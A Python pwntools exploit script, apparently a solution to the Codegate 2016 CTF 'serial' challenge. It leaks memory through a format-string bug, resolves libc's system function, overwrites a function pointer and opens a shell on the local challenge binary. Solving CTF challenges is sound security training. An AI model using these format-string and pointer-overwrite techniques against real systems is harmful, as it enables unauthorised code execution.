#!/usr/bin/python2
# Source: http://ebfe.dk/ctf/2016/03/21/codegate_quals_serial/

from pwn import *

e = ELF("./serial")
r = process("./serial")

r.recvuntil("input product key:")
r.sendline("615066814080")

entry_buf_size = 24
printfplt = 0x11820 # pwntools is buggy, must get plt offset manually

@MemLeak
def leak(addr):
    r.recvuntil("choice >> ")
    r.sendline("1")
    r.sendline("BB%15$sCC".ljust(entry_buf_size) + p64(printfplt))
    # This is placed somewhere on the stack.
    r.sendline("3AAAAAAA"+p64(addr))
    # remember to remove the element, we only have 10.
    r.sendline("2\n0")
    r.recvuntil("BB")

    data = r.recvuntil("CC")[:-2] + "\x00"

    r.recvuntil("choice >> ")
    return data

# Magic from pwntools, which does pointer chasing and hashtable
# lookups to find stuff in memory. You should check it out.
d = DynELF(leak, elf = e)
log.info("inited, starting lookup")
system = d.lookup("system", "libc.so")

r.recvuntil("choice >> ")
r.sendline("1")
r.sendline("sh;".ljust(entry_buf_size) + p64(system))
r.sendline("3")

r.clean()
r.interactive()
